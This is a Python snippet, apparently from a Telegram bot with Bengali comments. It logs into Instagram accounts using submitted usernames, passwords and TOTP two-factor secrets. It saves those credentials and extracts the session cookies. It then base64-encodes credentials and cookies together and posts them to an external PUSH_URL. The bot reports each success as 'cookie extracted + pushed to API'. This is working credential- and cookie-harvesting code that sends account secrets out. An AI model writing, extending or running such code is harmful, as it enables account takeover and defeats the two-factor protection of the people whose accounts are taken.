user_data_storage = {}

def push_to_api(u, p, cookie_dict):
    ck_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
    converted = f"{u}:{p}|||{ck_str}||"
    encoded_payload = base64.b64encode(converted.encode()).decode()
    payload = f"accounts={encoded_payload}"
    headers = {"Content-Type": "text/plain"}
    try:
        res = requests.post(PUSH_URL, data=payload, headers=headers, timeout=15)
        if res.status_code == 200:
            if res.json().get("data", {}).get("received_count", 0) > 0:
                return True, "Success"
        return False, f"Error {res.status_code}"
    except: return False, "API Fail"

def login_worker(chat_id, u, p, k):
    L = instaloader.Instaloader(quiet=True)
    try:
        L.login(u, p)
    except instaloader.exceptions.TwoFactorAuthRequiredException:
        if k:
            totp = pyotp.TOTP(k.replace(" ", ""))
            try: L.two_factor_login(totp.now())
            except: return
        else: return
    except: return

    if L.context.is_logged_in:
        user_data_storage[chat_id]['cookie_count'] += 1
        sid = str(chat_id)
        if sid not in daily_db: daily_db[sid] = []
        
        # ডুপ্লিকেট ইউজারনেম ও কি চেক
        is_duplicate = False
        for entry in daily_db[sid]:
            if entry[0] == u or (k and entry[2] == k):
                is_duplicate = True
                break
        
        if not is_duplicate:
            daily_db[sid].append([u, p, k if k else "N/A"])
            save_db(daily_db)
        
        cookies = L.context._session.cookies.get_dict()
        ck_val = "; ".join([f"{key}={val}" for key, val in cookies.items()])
        user_data_storage[chat_id]['results'].append(f"{u}|{p}|{ck_val}")
        
        success, status_msg = push_to_api(u, p, cookies)
        if success:
            user_data_storage[chat_id]['push_ok'] += 1
            bot.send_message(chat_id, f"✅ **{u}**\nকুকি বের হইছে + এপিআই-তে পুশ ডান! 🔥")
        else:
            user_data_storage[chat_id]['push_fail'] += 1
            bot.send_message(chat_id, f"⚠️ **{u}**\nকুকি পাইছি কিন্তু পুশ ফেল! ({status_msg})")

